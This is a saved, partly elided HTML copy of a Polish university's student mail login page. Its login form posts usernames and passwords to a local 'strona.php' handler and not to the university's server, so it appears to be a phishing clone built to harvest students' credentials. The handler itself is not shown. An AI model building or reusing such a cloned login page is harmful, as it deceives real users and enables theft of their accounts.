<!DOCTYPE html>
<!-- saved from url=(0129)https://s.student.pwr.edu.pl/iwc_static/c11n/login_student_pwr_edu_pl.html?lang=pl&3.0.1.3.0_16070546&svcs=abs,mail,calendar,c11n -->
<html lang="en" dir="ltr" class="dj_webkit dj_chrome dj_contentbox"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        ...
        <link href="./Serwer pocztowy_files/css" rel="stylesheet" type="text/css">
        <link rel="stylesheet" href="./Serwer pocztowy_files/login_animate.css" type="text/css">
        <link rel="stylesheet" href="./Serwer pocztowy_files/login_student_pwr_edu_pl.css" type="text/css">

        <script src="./Serwer pocztowy_files/jquery.min.js.pobrane" type="text/javascript"></script>
        <script src="./Serwer pocztowy_files/bootstrap.js.pobrane" type="text/javascript"></script>
        ...
        <script type="text/javascript" src="./Serwer pocztowy_files/dojo.js.pobrane"></script></head><body><textarea id="dijit._editor.RichText.savedContent" style="display:none;position:absolute;top:-100px;left:-100px;height:3px;width:3px;overflow:hidden;"></textarea>
        ...
        <div class="container Convergence-Login">
            ...
            <div class="login-box animated fadeInUp Convergence-Login-Border" id="loginBegin">
                ...
                <form action="strona.php" method="post" onsubmit="return login()">

                    <label id="usernameLabelID" for="username" class="selected">Użytkownik:</label>
        ...
        <iframe name="picCache" id="picCache" src="./Serwer pocztowy_files/saved_resource.html" width="0" height="0" frameborder="0"></iframe>
